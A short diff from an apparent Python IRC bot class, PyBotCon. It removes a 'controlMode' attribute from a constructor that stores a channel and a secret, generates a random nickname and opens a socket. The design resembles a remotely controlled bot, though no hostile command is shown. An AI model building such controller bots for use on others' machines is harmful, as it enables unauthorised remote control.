@@ -27,7 +27,6 @@ class PyBotCon:
     self.channel = channel
     self.secret = secret
     self.nick = self.generateRandomName()
-    self.controlMode = 0 #default 0 = bot not being controller
 
     try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
       self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
